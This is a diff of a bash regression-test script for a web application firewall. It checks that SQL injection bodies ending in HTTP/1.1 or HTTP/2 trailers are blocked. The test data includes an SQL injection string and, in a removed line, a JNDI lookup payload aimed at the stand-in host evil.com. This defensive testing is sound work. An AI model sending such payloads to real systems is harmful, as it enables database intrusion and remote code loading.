@@ -64,10 +64,16 @@ assert_body() {
     rm -f "$tmp"
 }
 
-# Drives tests/trailer_client.py from a throwaway container on the compose network.
-# curl cannot emit HTTP trailers and bash's /dev/tcp is not reliably available, so the
-# raw request is sent from inside the network instead of through the published port.
-# See tests/trailer_client.py for why the trailer case needs its own coverage.
+# Drives the trailer clients from a throwaway container on the compose network. curl
+# cannot emit HTTP trailers and bash's /dev/tcp is not reliably available, so the raw
+# request is sent from inside the network rather than through the published port.
+#
+# Two transports, and they are not equivalent. Envoy's HTTP/1 codec drops trailers unless
+# Http1ProtocolOptions.enable_trailers is set, so the HTTP/1.1 case terminates the stream
+# on its final chunk and dispatches through the ordinary body path - it passes with or
+# without the trailer handler. HTTP/2 always delivers trailers, so that is the transport
+# where the bypass is reachable and the one that actually exercises the fix. Confirmed by
+# removing the handler: HTTP/2 returned 200, HTTP/1.1 still returned 403.
 TRAILER_TARGET_SERVICE="${TRAILER_TARGET_SERVICE:-envoy}"
 TRAILER_TARGET_PORT="${TRAILER_TARGET_PORT:-8000}"
 TRAILER_NETWORK="${TRAILER_NETWORK:-tests_default}"
@@ -96,6 +102,30 @@ assert_trailer_status() {
 
 # Asserts a marker appears in a service's log. Used to prove a test actually exercised
 # the code path it claims to, rather than passing for an unrelated reason.
+# HTTP/2 variant. Needs the h2 library, installed into the throwaway container at call
+# time to avoid adding a build step for two assertions.
+assert_h2_trailer_status() {
+    local description="$1"
+    local expected="$2"
+    local body="$3"
+    TOTAL=$((TOTAL + 1))
+
+    local status
+    status=$(docker run --rm --network "$TRAILER_NETWORK" \
+        -v "$(pwd)/h2_trailer_client.py:/h2_trailer_client.py:ro" \
+        python:3-alpine sh -c "pip install -q h2 >/dev/null 2>&1 && python3 /h2_trailer_client.py \
+        '$TRAILER_TARGET_SERVICE' '$TRAILER_TARGET_PORT' /post \"$body\"" 2>/dev/null) || true
+    status="${status:-no-response}"
+
+    if [ "$status" = "$expected" ]; then
+        echo -e "${GREEN}PASS${NC} [$status] $description"
+        PASS=$((PASS + 1))
+    else
+        echo -e "${RED}FAIL${NC} [$status expected $expected] $description"
+        FAIL=$((FAIL + 1))
+    fi
+}
+
 assert_log_contains() {
     local description="$1"
     local service="$2"
@@ -407,14 +437,21 @@ echo -e "${YELLOW}=== WAF Bypass Regressions (expect 403) ===${NC}"
 echo ""
 
 # Trailers used to suppress the AppSec dispatch entirely
-assert_trailer_status "SQLi in a chunked body terminated by trailers" 403 \
+# HTTP/2 is where the trailer bypass is reachable: with the handler removed these
+# return 200 instead of 403
+assert_h2_trailer_status "HTTP/2: SQLi in a body terminated by trailers" 403 \
     "username=admin' OR 1=1--"
 
-assert_trailer_status "JNDI in a chunked body terminated by trailers" 403 \
-    'input=${jndi:ldap://evil.com/exploit}'
+# Negative control: dispatching on trailers must not become a blanket block
+assert_h2_trailer_status "HTTP/2: clean body terminated by trailers still passes" 200 \
+    'field=value&other=thing'
 
-# Negative control: dispatching on trailers must not turn into a blanket block
-assert_trailer_status "Clean chunked body terminated by trailers still passes" 200 \
+# HTTP/1.1 trailers are dropped by Envoy's codec by default, so these cover the
+# stream-ends-on-final-chunk path rather than the trailer handler
+assert_trailer_status "HTTP/1.1: SQLi in a chunked body with a trailer section" 403 \
+    "username=admin' OR 1=1--"
+
+assert_trailer_status "HTTP/1.1: clean chunked body with a trailer section passes" 200 \
     'field=value&other=thing'
 
 # Only User-Agent and Cookie used to reach AppSec, so every other header was invisible
